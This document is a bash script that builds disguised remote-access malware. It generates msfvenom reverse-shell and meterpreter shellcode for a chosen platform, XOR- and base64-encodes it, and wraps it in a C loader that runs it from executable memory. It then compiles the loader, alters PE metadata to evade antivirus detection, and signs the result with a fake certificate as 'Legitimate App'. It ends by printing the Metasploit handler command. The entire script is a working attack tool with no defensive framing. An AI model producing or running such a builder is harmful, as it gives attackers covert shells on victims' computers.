#!/bin/bash
set -e

#!/bin/bash

GREEN='\033[0;32m'
NC='\033[0m'

text="${GREEN}
░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
░▒▓█▓▒▒▓███▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░   ░▒▓█▓▒░   ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒▒▓███▓▒░▒▓██████▓▒░   
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓████████▓▒░${NC}"

echo "$text"

# Configuration
LHOST="10.1.87.242"
LPORT="4444"
PAYLOAD_NAME="legit_app"
TEMP_EXE="temp_payload.exe"
SIGN_CERT="evil_corp.pfx"
SHELLCODE_RAW="sc.raw"
HEADER_FILE="shellcode_encoded.h"

# Payload options
payloads=(
  "windows/x64/meterpreter/reverse_tcp"
  "windows/x64/meterpreter/reverse_https"
  "windows/x64/meterpreter/reverse_http"
  "windows/meterpreter/reverse_tcp"
  "windows/meterpreter/reverse_https"
  "windows/meterpreter/reverse_http"
  "windows/x64/shell/reverse_tcp"
  "windows/shell/reverse_tcp"
  "linux/x64/meterpreter/reverse_tcp"
  "linux/x86/meterpreter/reverse_tcp"
  "linux/x64/shell/reverse_tcp"
  "linux/x86/shell/reverse_tcp"
  "osx/x64/meterpreter/reverse_tcp"
  "osx/x86/meterpreter/reverse_tcp"
  "osx/x64/shell/reverse_tcp"
  "osx/x86/shell/reverse_tcp"
  "android/meterpreter/reverse_tcp"
  "php/meterpreter/reverse_tcp"
  "python/meterpreter/reverse_tcp"
  "java/meterpreter/reverse_tcp"
  "custom"
)

# Display payload options
echo "Select payload:"
for i in "${!payloads[@]}"; do
  echo "$((i + 1)). ${payloads[$i]}"
done

# Get user input
read -p "Enter payload number: " payload_num

# Validate input
if [[ "$payload_num" -lt 1 || "$payload_num" -gt "${#payloads[@]}" ]]; then
  echo "Invalid payload number."
  exit 1
fi

# Set payload
selected_payload="${payloads[$((payload_num - 1))]}"

# Handle custom payload
if [[ "$selected_payload" == "custom" ]]; then
  read -p "Enter custom payload (e.g., windows/x64/shell/reverse_tcp): " selected_payload
fi

# Randomize XOR key
XOR_KEY=$(( ( RANDOM % 254 ) + 1 ))
HEX_KEY=$(printf "%02x" $XOR_KEY)
echo "[+] XOR key: 0x$HEX_KEY"

# Generate raw shellcode
echo "[+] Generating raw shellcode..."
msfvenom -p "$selected_payload" LHOST="$LHOST" LPORT="$LPORT" EXITFUNC=thread -f raw -o "$SHELLCODE_RAW"

# Encode shellcode
echo "[+] Encoding shellcode..."
python3 - <<EOF
import base64

key = $XOR_KEY
with open("$SHELLCODE_RAW", "rb") as f:
    sc = f.read()

xor_encoded = bytes([b ^ key for b in sc])
b64_encoded = base64.b64encode(xor_encoded).decode()

with open("$HEADER_FILE", "w") as f:
    f.write("#pragma once\\n")
    f.write("const char *b64_shellcode =\n")
    for i in range(0, len(b64_encoded), 80):
        f.write(f' "{b64_encoded[i:i+80]}"\n')
    f.write(";\n")

    f.write(f"const unsigned char XOR_KEY = 0x{key:02x};\\n")
EOF

# Create C loader
echo "[+] Creating C loader..."
cat <<EOF > payload.c
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "shellcode_encoded.h"

#pragma comment(lib, "crypt32.lib")

DWORD Base64Decode(const char* input, BYTE** output) {
    DWORD len = 0;
    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL);
    *output = (BYTE*)malloc(len);
    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, *output, &len, NULL, NULL);
    return len;
}

void DecryptShellcode(BYTE* data, DWORD len, BYTE key) {
    for (DWORD i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

void ExecuteShellcode(BYTE* shellcode, DWORD len) {
    LPVOID exec = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, len);
    ((void(*)())exec)();
}

int main() {
    Sleep(1500);
    BYTE* decoded = NULL;
    DWORD len = Base64Decode(b64_shellcode, &decoded);
    DecryptShellcode(decoded, len, XOR_KEY);
    ExecuteShellcode(decoded, len);
    free(decoded);
    return 0;
}
EOF

# Compile with MinGW
echo "[+] Compiling with MinGW..."
x86_64-w64-mingw32-gcc payload.c -o "$TEMP_EXE" -lcrypt32 -s -static -Wl,--nxcompat -Wl,--dynamicbase -Wl,--high-entropy-va

# Modify PE with evasion
echo "[+] Modifying PE with evasion techniques..."
python3 - <<EOF
import lief
import random
import time

MEM_READ = 0x40000000
MEM_WRITE = 0x80000000
MEM_EXECUTE = 0x20000000
CNT_CODE = 0x00000020
CNT_INITIALIZED_DATA = 0x00000040

def modify_pe(input_path, output_path):
    binary = lief.parse(input_path)
    if binary is None:
        raise RuntimeError("Failed to parse PE")

    binary.header.time_date_stamps = int(time.time()) - random.randint(1_000_000, 10_000_000)

    if binary.has_debug:
        binary.remove_debug()

    if binary.has_rich_header:
        binary.rich_header = None

    for section in binary.sections:
        if section.name not in [".text", ".rdata", ".idata"]:
            section.name = ".data1"

        if section.has_characteristic(0x20000000):
            section.characteristics = MEM_READ | MEM_EXECUTE | CNT_CODE
        else:
            section.characteristics = MEM_READ | MEM_WRITE | CNT_INITIALIZED_DATA

        if section.size > 0x100:
            section.size += (0x10 - (section.size % 0x10))

    builder = lief.PE.Builder(binary)
    builder.build()
    builder.write(output_path)

modify_pe("$TEMP_EXE", "$TEMP_EXE")
EOF

# Sign executable
echo "[+] Generating fake self-signed cert..."
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=Evil Corp LLC"

echo "[+] Creating PFX..."
openssl pkcs12 -export -out "$SIGN_CERT" -inkey key.pem -in cert.pem -passout pass:123456

echo "[+] Signing executable..."
osslsigncode sign -pkcs12 "$SIGN_CERT" -pass 123456 -n "Legitimate App" -i http://www.example.com -in "$TEMP_EXE" -out "$PAYLOAD_NAME.exe"

# Cleanup
rm -f "$SHELLCODE_RAW" "$HEADER_FILE" payload.c "$TEMP_EXE" key.pem cert.pem "$SIGN_CERT"

echo "[+] Payload ready: $PAYLOAD_NAME.exe"
echo "[!] Use handler:"
echo " msfconsole -qx 'use exploit/multi/handler; set PAYLOAD $selected_payload; set LHOST=$LHOST; set LPORT=$LPORT; run'"
